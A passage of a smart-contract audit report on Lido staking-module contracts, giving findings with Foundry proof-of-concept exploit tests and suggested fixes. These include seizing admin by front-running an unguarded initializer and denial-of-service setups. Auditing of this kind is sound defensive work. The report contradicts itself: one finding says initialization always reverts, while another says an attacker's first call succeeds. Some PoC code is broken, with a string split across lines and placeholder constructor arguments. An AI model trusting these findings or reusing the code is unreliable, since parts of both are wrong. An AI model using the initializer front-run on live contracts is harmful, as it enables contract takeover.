    CSFeeOracle implementation;
    CSFeeOracle proxy;

    address admin = makeAddr("admin");
    address mockConsensus = makeAddr("mockConsensus");
    uint256 consensusVersion = 1;

    function setUp() public {
        implementation = new CSFeeOracle(address(1), address(2), 12, block.timestamp);
        OssifiableProxy p = new OssifiableProxy(address(implementation), admin, "");
        proxy = CSFeeOracle(address(p));
    }

    function testInitializeReverts() public {
        vm.prank(admin);
        vm.expectRevert(); // any revert proves initialization is impossible
        proxy.initialize(admin, mockConsensus, consensusVersion);
    }
}


## Suggested Mitigation
The versioning logic in the `initialize` function should be corrected to set the version directly to `2`, as this is the intended initial version for this contract implementation. This can be achieved by modifying the call to `BaseOracle._initialize` to pass `2` as the `contractVersion` and removing the subsequent, redundant call to `_updateContractVersion`.

```solidity
// src/CSFeeOracle.sol

    /// @dev initialize contract from scratch
    function initialize(
        address admin,
        address consensusContract,
        uint256 consensusVersion
    ) external {
        if (admin == address(0)) {
            revert ZeroAdminAddress();
        }

        _grantRole(DEFAULT_ADMIN_ROLE, admin);

-       BaseOracle._initialize(consensusContract, consensusVersion, 0);
-
-       _updateContractVersion(2);
+       BaseOracle._initialize(consensusContract, consensusVersion, 2);
    }
```



# Low Risk Findings

## [L-1]. Zero Code issue in CSStrikes::constructor

## Description
In the constructor of `CSStrikes`, an external call is made to `MODULE.accounting()` to retrieve the address of the `ACCOUNTING` contract. The returned address is then stored in an immutable variable. However, the constructor does not validate that the returned address is non-zero. If the `module` address passed to the constructor is an EOA or a contract that is not yet fully initialized, `MODULE.accounting()` could return `address(0)`. This would set the immutable `ACCOUNTING` variable to `address(0)`, permanently impairing the contract's core functionality. Any subsequent call to `processBadPerformanceProof` will revert when it attempts to use the `ACCOUNTING` address, leading to a permanent Denial of Service.

## Impact
If the constructor stores ACCOUNTING as address(0) the CSStrikes instance can never execute _ejectByStrikes, making processBadPerformanceProof permanently unusable. Although no funds can be stolen, the contract that has already been granted roles and referenced by other components of the system becomes irreversibly bricked and must be redeployed, causing operational disruption.

## Proof of Concept
1. Deploy a malicious (or un-initialised) module that returns address(0) from accounting().
2. Deploy CSStrikes with this module address.
3. Prepare a single KeyStrikes leaf and compute its leaf hash using CSStrikes.hashLeaf.
4. Have the oracle set treeRoot to this hash via processOracleReport so that the Merkle proof consisting of empty arrays is considered valid.
5. Call processBadPerformanceProof with msg.value > 0.  Verification succeeds, execution reaches _ejectByStrikes, which tries to call ACCOUNTING.getBondCurveId on address(0) and the transaction reverts.
6. Any future invocation will keep reverting, proving permanent DoS.

## Proof of Code
pragma solidity 0.8.24;
import "forge-std/Test.sol";
import {CSStrikes, ICSStrikes} from "../src/CSStrikes.sol";
import {ICSModule} from "../src/interfaces/ICSModule.sol";
import {ICSAccounting} from "../src/interfaces/ICSAccounting.sol";

contract BadModule is ICSModule {
    function accounting() external view override returns (ICSAccounting) {
        return ICSAccounting(address(0));
    }
    // minimal stubs
    function getSigningKeys(uint256, uint256, uint256) external pure override returns (bytes memory) {
        return bytes("dummy");
    }
    function getNodeOperator(uint256) external pure returns (NodeOperator memory) { revert(); }
    function getNodeOperatorsCount() external pure returns (uint256) { return 0; }
    function getStakingModuleSummary() external pure returns (uint256,uint256,uint256) { revert(); }
}

contract ZeroAccountingConstructorTest is Test {
    CSStrikes strikes;

    function setUp() public {
        BadModule bad = new BadModule();
        strikes = new CSStrikes(address(bad), address(this), address(this), address(this));

        // craft a leaf that will pass verification
        CSStrikes.KeyStrikes memory ks;
        ks.nodeOperatorId = 1;
        ks.keyIndex = 0;
        ks.data = new uint256[](1);
        ks.data[0] = 1;
        bytes memory pubkey = bad.getSigningKeys(1,0,1);
        bytes32 leaf = strikes.hashLeaf(ks, pubkey);

        // act as oracle to set root == leaf so empty proof passes
        strikes.processOracleReport(leaf, "cid");
    }

    function test_DoS_due_to_zeroAccounting() public {
        CSStrikes.KeyStrikes[] memory list = new CSStrikes.KeyStrikes[](1);
        list[0] = CSStrikes.KeyStrikes({nodeOperatorId:1,keyIndex:0,data:new uint256[](1)});
        list[0].data[0] = 1;

        bytes32[] memory proof = new bytes32[](0);
        bool[] memory flags = new bool[](0);

        vm.expectRevert();
        strikes.processBadPerformanceProof{value: 1 ether}(list, proof, flags, address(this));
    }
}

## Suggested Mitigation
In the constructor check that address(MODULE.accounting()) != address(0) and revert (e.g., with a custom error ZeroAccountingAddress()). This guarantees a valid ACCOUNTING pointer is stored and prevents an unusable deployment.

## [L-2]. Oracle issue in VettedGate::claimReferrerBondCurve

## Description
The `claimReferrerBondCurve` function allows a node operator who has successfully referred others to claim a beneficial bond curve. To do so, they must prove they are on the vetted list using a Merkle proof. The function validates this proof against the current `treeRoot`. However, referrals are associated with a specific `referralProgramSeasonNumber`. If the Merkle tree is updated by the `SET_TREE_ROLE` holder after a user has accumulated enough referrals but before they have claimed their reward, they might be removed from the new tree. This would cause their `claimReferrerBondCurve` transaction to fail, as their proof would be invalid against the new `treeRoot`. The contract does not store historical tree roots or link referral seasons to specific tree versions, leading to a scenario where legitimate referrers can lose their earned rewards.

```solidity
// VettedGate.sol:346-353
function claimReferrerBondCurve(
    uint256 nodeOperatorId,
    bytes32[] calldata proof
) external whenResumed {
    _onlyNodeOperatorOwner(nodeOperatorId);

    // @dev Only members from the current merkle tree can claim the referral bond curve
    if (!verifyProof(msg.sender, proof)) { // This uses the current `treeRoot`
        revert InvalidProof();
    }
//...
}
```

## Impact
A referrer who legitimately earned the right to a beneficial bond curve can be prevented from claiming it due to an administrative update of the vetted list (Merkle tree). This creates a trust issue and undermines the referral program's incentive structure, as rewards are not guaranteed even when the conditions are met. This could disincentivize participation in the referral program and lead to loss of earned rewards for users.

## Proof of Concept
1. A referral season `S` starts with `treeRoot` `T1`.
2. Alice is on the vetted list corresponding to `T1`.
3. Alice refers enough new node operators during season `S` to meet the `referralsThreshold`.
4. Before Alice can claim her reward, the `SET_TREE_ROLE` holder updates the vetted list, setting a new `treeRoot` `T2`. Alice is not on the new list `T2`.
5. Alice attempts to call `claimReferrerBondCurve`, providing her valid proof for tree `T1`.
6. The `verifyProof` check inside the function fails because it validates the proof against the current `treeRoot` (from `T2`), not `T1`.
7. Alice is unfairly blocked from claiming her earned reward.

## Proof of Code
```solidity
// test/VettedGate.t.sol
// This test demonstrates that a valid referrer can be blocked from claiming rewards if the Merkle tree changes.

// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import { VettedGateTest } from "./VettedGate.t.sol";
import { NodeOperatorManagementProperties } from "../../src/interfaces/ICSModule.sol";
import { MerkleTree } from "../helpers/MerkleTree.sol";
import { IVettedGate } from "../../src/interfaces/IVettedGate.sol";

contract PocOrphanedRewardsTest is VettedGateTest {
    function test_PoC_CannotClaimAfterTreeUpdate() public {
        // 1. SETUP: Create Tree 1 with 'alice' as a member.
        address alice = makeAddr("alice");
        address charlie = makeAddr("charlie"); // User who will join
        address[] memory membersT1 = new address[](2);
        membersT1[0] = alice;
        membersT1[1] = charlie;
        MerkleTree memory tree1 = new MerkleTree(membersT1);

        // 2. CONFIGURE: Set Tree 1 and start referral season 1 with a threshold of 1.
        vm.prank(csmCommittee);
        vettedGate.setTreeParams(tree1.getRoot(), "cid1");
        vm.prank(csmCommittee);
        vettedGate.startNewReferralProgramSeason(REFERRAL_CURVE_ID, 1);

        // 3. ACTION: 'charlie' joins and refers 'alice'. Alice now meets the threshold.
        bytes32[] memory charlieProof = tree1.getProof(charlie);
        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress: charlie,
            rewardAddress: charlie
        });
        vm.prank(charlie);
        vm.deal(charlie, 1 ether);
        uint256 noIdForCharlie = vettedGate.addNodeOperatorETH{value: 1 ether}(
            1, bytes(""), bytes(""), props, charlieProof, alice
        );
        assertEq(vettedGate.getReferralsCount(alice, vettedGate.referralProgramSeasonNumber()), 1);

        // Assume Alice has a node operator ID from a previous action.
        uint256 noIdForAlice = 0; // For simplicity.

        // 4. ADMIN ACTION: Update Merkle tree to Tree 2, which does NOT include 'alice'.
        address[] memory membersT2 = new address[](1);
        membersT2[0] = makeAddr("dave");
        MerkleTree memory tree2 = new MerkleTree(membersT2);
        vm.prank(csmCommittee);
        vettedGate.setTreeParams(tree2.getRoot(), "cid2");

        // 5. EXPLOIT: Alice tries to claim her referral reward using her proof from Tree 1.
        bytes32[] memory proofForT1 = tree1.getProof(alice);
        vm.prank(alice);
        
        // The call must revert because her proof is for rootT1, but the contract's current root is rootT2.
        vm.expectRevert(IVettedGate.InvalidProof.selector);
        vettedGate.claimReferrerBondCurve(noIdForAlice, proofForT1);
    }
}
```

## Suggested Mitigation
The contract should associate each referral season with the Merkle tree root that was active when it started. When a user claims a referral reward, the proof should be validated against the historical root of the relevant season, not the current one. This can be implemented by storing the `treeRoot` for each season.

```solidity
// Suggested change in VettedGate.sol

// Add a new state variable to track tree roots per season
mapping(uint256 => bytes32) private _seasonToTreeRoot;

// In startNewReferralProgramSeason()
function startNewReferralProgramSeason(
    uint256 _referralCurveId,
    uint256 _referralsThreshold
) external onlyRole(START_REFERRAL_SEASON_ROLE) returns (uint256 season) {
    if (isReferralProgramSeasonActive) {
        revert ReferralProgramIsActive();
    }
    // ... other checks

    referralCurveId = _referralCurveId;
    referralsThreshold = _referralsThreshold;
    isReferralProgramSeasonActive = true;

    season = referralProgramSeasonNumber + 1;
    referralProgramSeasonNumber = season;

    // Store the current tree root for the new season
    _seasonToTreeRoot[season] = treeRoot;

    emit ReferralProgramSeasonStarted(
        season,
        _referralCurveId,
        _referralsThreshold
    );
}

// In claimReferrerBondCurve()
function claimReferrerBondCurve(
    uint256 nodeOperatorId,
    bytes32[] calldata proof
) external whenResumed {
    _onlyNodeOperatorOwner(nodeOperatorId);

    if (!isReferralProgramSeasonActive) {
        revert ReferralProgramIsNotActive();
    }

    uint256 season = referralProgramSeasonNumber;
    bytes32 historicalRoot = _seasonToTreeRoot[season];

    // Verify proof against the historical root for that season
    if (historicalRoot == bytes32(0) || !MerkleProof.verifyCalldata(proof, historicalRoot, hashLeaf(msg.sender))) {
        revert InvalidProof();
    }

    // ... rest of the function ...
}
```

## [L-3]. Pausable Emergency Stop issue in CSAccounting::pullFeeRewards

## Description
The `pullFeeRewards` function, which allows triggering the distribution of fee rewards to a Node Operator's bond, is missing the `whenResumed` modifier. In contrast, all other external functions in `CSAccounting` that cause state changes (`deposit*`, `claimRewards*`) are pausable. This inconsistency allows `pullFeeRewards` to be called even when the system is in an emergency paused state, which could lead to unintended state changes that undermine the purpose of the pause (e.g., if reward calculations are found to be faulty and the pause is intended to prevent their distribution).

## Impact
While the contract is paused, external actors are supposed to be blocked from changing critical state. Because pullFeeRewards() lacks the whenResumed modifier, anyone can still move already-distributed reward shares from CSFeeDistributor into the Node Operator’s bond during the pause. This undermines the pause’s purpose (e.g., while a calculation bug is investigated) but does NOT allow theft of protocol funds, permanent loss, or denial-of-service. It merely allows accounting changes that may later have to be rolled back by governance.

## Proof of Concept
1. Deploy CSAccounting behind an OssifiableProxy (or reuse an existing deployment).
2. Give an EOA the PAUSE_ROLE and call pauseFor(1 days).
3. Using the same or another EOA, call depositETH(0) ⇒ tx reverts with ResumedExpected().
4. In the same paused state call pullFeeRewards(0, 0, new bytes32[](0)). The call is executed (it reverts with NodeOperatorDoesNotExist or with a FeeDistributor error, but NOT with ResumedExpected()). This proves the function ignores the paused state.
5. If a valid nodeOperatorId and proof are supplied, the bond balance would increase even though the module is paused.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import { Test, Vm } from "forge-std/Test.sol";
import { CSAccounting } from "../../src/CSAccounting.sol";
// ... imports for mocks ...

// PoC requires mocks for dependencies like CSModule, CSFeeDistributor, etc.
// Assuming a test setup similar to the Flash Loan PoC.

contract PausablePoC is Test {
    // ... setUp() function to deploy CSAccounting and mocks ...
    CSAccounting accounting;
    address pauser = makeAddr("pauser
");
    bytes32 PAUSE_ROLE = keccak256("PAUSE_ROLE");

    function setUp() public { 
        // Simplified setup
        // ... deploy mocks and CSAccounting ...
        accounting = new CSAccounting(...);
        accounting.initialize(...);
        accounting.grantRole(PAUSE_ROLE, pauser);
    }

    function testPullFeeRewards_IsNotPausable() public {
        // 1. Pause the contract
        vm.prank(pauser);
        accounting.pauseFor(1 days);

        assertTrue(accounting.isPaused(), "Contract should be paused");

        // 2. Show a pausable function fails
        vm.expectRevert(bytes("ResumedExpected()"));
        accounting.depositETH{value: 1 ether}(0);

        // 3. Show pullFeeRewards succeeds despite the pause
        // We need to mock the external call to CSFeeDistributor to avoid revert
        // For this PoC, we expect it to revert due to a different reason than being paused,
        // proving the whenResumed check is missing.
        vm.expectRevert("NodeOperatorDoesNotExist()"); // or revert from mock
        accounting.pullFeeRewards(0, 0, new bytes32[](0));

        // A successful call would demonstrate the vulnerability.
        // With mocks, we could make it succeed:
        // vm.mockCall(address(feeDistributor), abi.encodeWithSelector(ICSFeeDistributor.distributeFees.selector, ...), ...);
        // accounting.pullFeeRewards(...); // This would succeed
    }
}
```

## Suggested Mitigation
Add the `whenResumed` modifier to the `pullFeeRewards` function signature to ensure it respects the contract's pausable state, consistent with other state-changing functions.

```solidity
// src/CSAccounting.sol:472
function pullFeeRewards(
    uint256 nodeOperatorId,
    uint256 cumulativeFeeShares,
    bytes32[] calldata rewardsProof
) external whenResumed { // <--- Add whenResumed modifier
    _onlyExistingNodeOperator(nodeOperatorId);
    _pullFeeRewards(nodeOperatorId, cumulativeFeeShares, rewardsProof);
    MODULE.updateDepositableValidatorsCount(nodeOperatorId);
}
```

## [L-4]. DOS issue in CSExitPenalties::processTriggeredExit

## Description
The functions `processExitDelayReport`, `processTriggeredExit`, and `processStrikesReport` are designed to record a penalty or fee only once for a given validator. They use a boolean flag (`isValue` in the `MarkedUint248` struct) to track whether a value has already been recorded. If this flag is true, the functions return early to prevent double-reporting. However, a vulnerability exists where if any of these functions are called with parameters that result in a zero value being recorded (e.g., a zero fee or penalty), the `isValue` flag is still set to `true`. This action is irreversible and permanently prevents a subsequent, correct, non-zero penalty or fee from ever being recorded for that validator. This can happen due to a bug, a race condition, or a premature report from a trusted component (`MODULE` or `STRIKES`). The consequence is a loss of funds for the protocol, as the intended penalty cannot be collected from the Node Operator's bond.

## Impact
If the Module contract (a privileged component) calls `processTriggeredExit` with a fee of zero, the zero is latched and any later correct, non-zero fee is ignored. The protocol therefore misses out on the intended penalty for that validator (up to `maxWithdrawalRequestFee`, currently 10 ETH). Because the function is protected by `onlyModule`, this can only happen due to an implementation bug or race-condition inside the Module, not through direct exploitation by an un-trusted party.

## Proof of Concept
1. A validator undergoes a triggered exit, and the `MODULE` contract is responsible for reporting the associated Triggerable Exit (TE) fee.
2. Due to a bug or a timing issue where the fee information is not yet available, the `MODULE` contract calls `CSExitPenalties.processTriggeredExit` for the validator with `withdrawalRequestPaidFee = 0`.
3. `CSExitPenalties` records the `withdrawalRequestFee` as 0 and sets its corresponding `isValue` flag to `true`.
4. Later, the `MODULE` contract obtains the correct, non-zero TE fee (e.g., 0.1 ETH) and calls `processTriggeredExit` again with the correct value.
5. The check `if (exitPenaltyInfo.withdrawalRequestFee.isValue)` is now true, causing the function to return immediately without updating the fee.
6. The correct fee is never recorded. When the validator's withdrawal is processed, this fee cannot be deducted from the Node Operator's bond, leading to a loss for the protocol.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "src/CSExitPenalties.sol";
import "src/interfaces/ICSModule.sol";
import "src/interfaces/ICSParametersRegistry.sol";
import "src/interfaces/ICSAccounting.sol";
import "src/interfaces/ICSExitPenalties.sol";

// Mock contracts with minimal implementation to satisfy the compiler.

contract MockAccounting is ICSAccounting {
    function getBondCurveId(uint256) external view override returns (uint256) { return 1; }
    function addBondCurve(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256) external override {}
    function claimRewardsStETH(uint256,uint256,bytes32[] calldata) external override returns (uint256, uint256) { return (0,0); }
    function depositETH(uint256) external payable override {}
    function depositStETH(uint256,uint256) external override {}
    function depositWstETH(uint256,uint256) external override {}
    function finalizeUpgradeV2() external override {}
    function getBondRequired(uint256,uint256) external view override returns (uint256,uint256,uint256,uint256,uint256) { return (0,0,0,0,0); }
    function getBondShares(uint256) external view override returns (uint256) { return 0; }
    function getClaimableBond(uint256,uint256,bytes32[] calldata) external view override returns (uint256) { return 0; }
    function getClaimableRewards(uint256,uint256,bytes32[] calldata) external view override returns (uint256) { return 0; }
    function lockBondETH(uint256,uint256,uint256) external override {}
    function setBondCurve(uint256,uint256) external override {}
    function totalBondShares() external view override returns (uint256) { return 0; }
}

contract MockParametersRegistry is ICSParametersRegistry {
    function getAllowedExitDelay(uint256) external view override returns (uint256) { return 1 days; }
    function getBadPerformancePenalty(uint256) external view override returns (uint256) { return 2 ether; }
    function getBondingCurve(uint256) external view override returns (BondingCurve memory) {}
    function getELRewardsStealingFine(uint256) external view override returns (uint256) {return 0;}
    function getExitDelayPenalty(uint256) external view override returns (uint256) { return 1 ether; }
    function getKeyRemovalCharge(uint256) external view override returns (uint256) {return 0;}
    function getMaxDepositableValidators(uint256) external view override returns (uint256) {return 0;}
    function getMaxWithdrawalRequestFee(uint256) external view override returns (uint256) { return 10 ether; }
    function getPerformanceCoefficients(uint256) external view returns (uint256, uint256, uint256, uint256) {return (0,0,0,0);}
    function getQueueLowestPriority() external view override returns (uint256) {return 0;}
    function getStrikesThreshold(uint256) external view override returns (uint256) {return 0;}
}

contract CSExitPenaltiesTest is Test {
    CSExitPenalties public penalties;
    MockAccounting public mockAccounting;
    MockParametersRegistry public mockRegistry;
    address public strikesAddress = address(0x57514B5); // STRIKES

    address constant MODULE_ADDRESS = address(0x4D0D); // a dummy address for the module

    uint256 constant NODE_OPERATOR_ID = 1;
    bytes PUB_KEY = abi.encodePacked("validator_pubkey_1");
    uint256 constant STRIKES_EXIT_TYPE_ID = 1;

    function setUp() public {
        mockAccounting = new MockAccounting();
        mockRegistry = new MockParametersRegistry();

        vm.mockCall(
            MODULE_ADDRESS,
            abi.encodeWithSelector(ICSModule.accounting.selector),
            abi.encode(address(mockAccounting))
        );

        penalties = new CSExitPenalties(MODULE_ADDRESS, address(mockRegistry), strikesAddress);
    }

    function test_PoC_ZeroFeePreventsRealFee() public {
        vm.startPrank(MODULE_ADDRESS);

        // Step 1 & 2: A bug in the MODULE causes it to report a zero fee first
        uint256 zeroFee = 0;
        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, zeroFee, STRIKES_EXIT_TYPE_ID);

        // Step 3: Verify the fee is recorded as 0 and the flag is set
        ExitPenaltyInfo memory info_after_zero_report = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
        assertEq(info_after_zero_report.withdrawalRequestFee.value, 0, "Fee should be 0");
        assertTrue(info_after_zero_report.withdrawalRequestFee.isValue, "isValue flag should be true after zero fee report");

        // Step 4: MODULE tries to report the correct, non-zero fee later
        uint256 realFee = 1 ether;
        penalties.processTriggeredExit(NODE_OPERATOR_ID, PUB_KEY, realFee, STRIKES_EXIT_TYPE_ID);

        // Step 5 & 6: The correct fee is not recorded because the flag was already set
        ExitPenaltyInfo memory info_after_real_report = penalties.getExitPenaltyInfo(NODE_OPERATOR_ID, PUB_KEY);
        assertEq(info_after_real_report.withdrawalRequestFee.value, 0, "Fee should still be 0, the update was ignored");
        assertNotEq(info_after_real_report.withdrawalRequestFee.value, realFee, "Real fee was not recorded");

        vm.stopPrank();
    }
}
```

## Suggested Mitigation
The contract should not set the `isValue` flag to `true` if the penalty or fee value being recorded is zero. This will allow a zero-value report to be effectively ignored, leaving the opportunity for a correct, non-zero report to be processed later. This logic should be applied to all three processing functions.

Example fix for `processTriggeredExit`:

```solidity
    function processTriggeredExit(
        uint256 nodeOperatorId,
        bytes calldata publicKey,
        uint256 withdrawalRequestPaidFee,
        uint256 exitType
    ) external onlyModule {
        if (exitType == VOLUNTARY_EXIT_TYPE_ID) {
            return;
        }

        bytes32 keyPointer = _keyPointer(nodeOperatorId, publicKey);
        ExitPenaltyInfo storage exitPenaltyInfo = _exitPenaltyInfo[keyPointer];
        if (exitPenaltyInfo.withdrawalRequestFee.isValue) {
            return;
        }
        uint256 curveId = ACCOUNTING.getBondCurveId(nodeOperatorId);
        uint256 maxFee = PARAMETERS_REGISTRY.getMaxWithdrawalRequestFee(
            curveId
        );

        uint256 fee = Math.min(withdrawalRequestPaidFee, maxFee);

        if (fee > 0) { // Suggested change: only record non-zero fees
            exitPenaltyInfo.withdrawalRequestFee = MarkedUint248(
                fee.toUint248(),
                true
            );
            emit TriggeredExitFeeRecorded({
                nodeOperatorId: nodeOperatorId,
                exitType: exitType,
                pubkey: publicKey,
                withdrawalRequestPaidFee: withdrawalRequestPaidFee,
                withdrawalRequestRecordedFee: fee
            });
        }
    }
```

## [L-5]. Zero Code issue in CSExitPenalties::constructor

## Description
The `CSExitPenalties` constructor initializes the `ACCOUNTING` contract address by calling `MODULE.accounting()`. However, it fails to validate that the address returned from this call is non-zero. If the `module` address provided to the constructor corresponds to a contract that is not fully initialized or returns `address(0)` for any reason, the `ACCOUNTING` immutable variable will be set to `address(0)`. Consequently, all functions that depend on the `ACCOUNTING` contract (e.g., `processExitDelayReport`, `processTriggeredExit`, `processStrikesReport`) will revert upon being called, because they will attempt to make a call to a zero address. This renders the `CSExitPenalties` contract permanently non-functional, requiring a redeployment to fix.

## Impact
A misconfiguration during deployment can lead to the `CSExitPenalties` contract being permanently disabled (denial of service). All penalty processing functions would revert, which could disrupt the entire penalty mechanism of the Community Staking Module. This would require deploying a new instance of the contract, potentially causing operational overhead and a time window where penalties are not correctly processed.

## Proof of Concept
1. A deployer script provides an address for the `module` parameter in the `CSExitPenalties` constructor that points to a contract which returns `address(0)` from its `accounting()` function.
2. The `CSExitPenalties` contract deploys successfully because the constructor only checks if the `module` address itself is non-zero, not the result of `MODULE.accounting()`.
3. The `ACCOUNTING` immutable variable inside `CSExitPenalties` is set to `address(0)`.
4. A trusted contract (e.g., `CSModule`) calls `processExitDelayReport` on the `CSExitPenalties` instance.
5. The call reverts because `processExitDelayReport` attempts to call `ACCOUNTING.getBondCurveId(...)`, which is an external call to `address(0)`.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSExitPenalties} from "src/CSExitPenalties.sol";
import {ICSExitPenalties, ExitPenaltyInfo, MarkedUint248} from "src/interfaces/ICSExitPenalties.sol";
import {ICSAccounting} from "src/interfaces/ICSAccounting.sol";
import {ICSModule, NodeOperator} from "src/interfaces/ICSModule.sol";

// A mock module that implements the ICSModule interface and returns address(0) for accounting().
contract MockModuleForPoC is ICSModule {
    function accounting() external pure returns (ICSAccounting) {
        return ICSAccounting(address(0));
    }

    // Minimal implementation to satisfy the compiler.
    function MODULE_TYPE() external pure returns (bytes32) { return bytes32(0); }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) { revert(); }
    function getNodeOperatorsCount() external pure returns (uint256) { return 0; }
    function getRoleMember(bytes32, uint256) external pure returns (address) { return address(0); }
    function getRoleMemberCount(bytes32) external pure returns (uint256) { return 0; }
    function hasRole(bytes32, address) external pure returns (bool) { return false; }
    function lidoLocator() external pure returns (address) { return address(0); }
    function stETH() external pure returns (address) { return address(0); }
    function parametersRegistry() external pure returns (address) { return address(0); }
    function getStakingModuleSummary() external pure returns (uint256, uint256, uint256) { return (0,0,0); }
    function getNodeOperatorSummary(uint256) external pure returns (uint256, uint256, bool) { return (0,0,false); }
    function isValidatorExitDelayPenaltyApplicable(uint256, bytes calldata, uint256) external pure returns (bool) { return false; }
    function submitWithdrawals(uint256[] calldata, address) external {} // solhint-disable-line no-empty-blocks
    function obtainDepositData(uint16) external pure returns (bytes[] memory, bytes[] memory) { revert(); }
    function decreaseNodeOperatorKeys(uint256, uint256) external {} // solhint-disable-line no-empty-blocks
    function createNodeOperator(address, address, bytes[] calldata, bytes[] calldata, address) external pure returns (uint256) { return 0; }
    function addSigningKeys(uint256, bytes[] calldata, bytes[] calldata) external {} // solhint-disable-line no-empty-blocks
    function removeSigningKeys(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
    function reportELRewardsStealingPenalty(uint256) external {} // solhint-disable-line no-empty-blocks
    function settleELRewardsStealingPenalty(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
    function onAccountingReport(uint256, uint256, uint256) external {} // solhint-disable-line no-empty-blocks
    function onWithdrawal(uint256, bytes calldata, uint256) external {} // solhint-disable-line no-empty-blocks
}

contract ZeroAddressCheckVulnerabilityTest is Test {
    CSExitPenalties internal exitPenalties;
    MockModuleForPoC internal mockModule;
    address internal mockParamsRegistry;
    address internal mockStrikes;

    function setUp() public {
        mockModule = new MockModuleForPoC();
        mockParamsRegistry = makeAddr("paramsRegistry");
        mockStrikes = makeAddr("strikes");

        exitPenalties = new CSExitPenalties(address(mockModule), mockParamsRegistry, mockStrikes);
    }

    function test_PoC_ConstructorAllowsZeroAccountingAddress() public {
        assertEq(address(exitPenalties.ACCOUNTING()), address(0), "ACCOUNTING should be address(0)");
    }

    function test_PoC_CoreFunctionalityIsBricked() public {
        uint256 nodeOperatorId = 1;
        bytes memory publicKey = abi.encodePacked("validator_public_key");
        uint256 eligibleToExitInSec = 9999;

        vm.prank(address(mockModule));

        vm.expectRevert(bytes(""));
        exitPenalties.processExitDelayReport(
            nodeOperatorId,
            publicKey,
            eligibleToExitInSec
        );
    }
}
```

## Suggested Mitigation
Add a zero-address check for the `accounting` address returned by `MODULE.accounting()` within the constructor. This ensures that the contract cannot be deployed with an invalid dependency, preventing it from entering a non-functional state.

```solidity
// src/CSExitPenalties.sol

// Add a new custom error
error ZeroAccountingAddress();

contract CSExitPenalties is ICSExitPenalties, ExitTypes {
    // ...

    constructor(address module, address parametersRegistry, address strikes) {
        if (module == address(0)) {
            revert ZeroModuleAddress();
        }
        if (parametersRegistry == address(0)) {
            revert ZeroParametersRegistryAddress();
        }
        if (strikes == address(0)) {
            revert ZeroStrikesAddress();
        }

        MODULE = ICSModule(module);
        PARAMETERS_REGISTRY = ICSParametersRegistry(parametersRegistry);
        ICSAccounting accounting = MODULE.accounting();
        if (address(accounting) == address(0)) {
            revert ZeroAccountingAddress();
        }
        ACCOUNTING = accounting;
        STRIKES = strikes;
    }

    // ...
}
```

## [L-6]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize

## Description
The `initialize` function in `CSFeeOracle` is intended for setting up the contract's initial state, including the admin role. However, it lacks the `initializer` modifier from OpenZeppelin's Initializable contract pattern. This allows any address to call this function at any time after the initial deployment, granting themselves the `DEFAULT_ADMIN_ROLE`. While a subsequent call might revert in the call to `_updateContractVersion(2)`, the `_grantRole` call would have already executed, making the attacker an admin and compromising the contract's access control.

## Impact
Because `initialize` is missing the `initializer` (or an equivalent internal guard), whoever manages to call it FIRST after the proxy is deployed becomes `DEFAULT_ADMIN_ROLE`.  After the very first successful call, any further invocation reverts due to the `Versioned._updateContractVersion(2)` check, so the attack window only exists between proxy deployment and the legitimate initialization transaction.  If an attacker front-runs or the project forgets to initialize, the contract ends up permanently administered by the attacker.

## Proof of Concept
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSFeeOracle} from "../src/CSFeeOracle.sol";
import {OssifiableProxy} from "../src/lib/proxy/OssifiableProxy.sol";

contract POC_FirstCallerWins is Test {
    CSFeeOracle impl;
    CSFeeOracle oracle;
    address feeDistributor = address(1);
    address strikes = address(2);
    address consensus = address(3);

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victimAdmin");

    function setUp() public {
        // deploy implementation
        impl = new CSFeeOracle(feeDistributor, strikes, 12, 1606824023);
        // deploy proxy WITHOUT calling initialize
        bytes memory empty;
        OssifiableProxy proxy = new OssifiableProxy(address(impl), address(this), empty);
        oracle = CSFeeOracle(address(proxy));
    }

    function test_AttackerBecomesAdmin() public {
        // attacker grabs admin before the legitimate initializer tx is sent
        vm.prank(attacker);
        oracle.initialize(attacker, address(0xBEEF), 1);

        assertTrue(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), attacker));
        assertFalse(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), victim));
    }
}


## Proof of Code
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSFeeOracle} from "src/CSFeeOracle.sol";
import {OssifiableProxy} from "src/lib/proxy/OssifiableProxy.sol";

contract CSFeeOracle_InitRace_Test is Test {
    CSFeeOracle oracle;
    address attacker = address(0xA11);

    function setUp() public {
        CSFeeOracle implementation = new CSFeeOracle(address(0x1), address(0x2), 12, 1606824023);
        OssifiableProxy proxy = new OssifiableProxy(address(implementation), address(this), "");
        oracle = CSFeeOracle(address(proxy));
    }

    function test_firstCallerWins() public {
        vm.prank(attacker);
        oracle.initialize(attacker, address(0xBEEF), 1);
        assertTrue(oracle.hasRole(oracle.DEFAULT_ADMIN_ROLE(), attacker));
    }
}

## Suggested Mitigation
Mark the function with `initializer` (or a custom `onlyInitializing` check) so it can only succeed once, closing the deployment-time race:

```solidity
function initialize(...) external initializer {
    ...
}
```



# Info Risk Findings

## [I-1]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processTriggeredExit

## Description
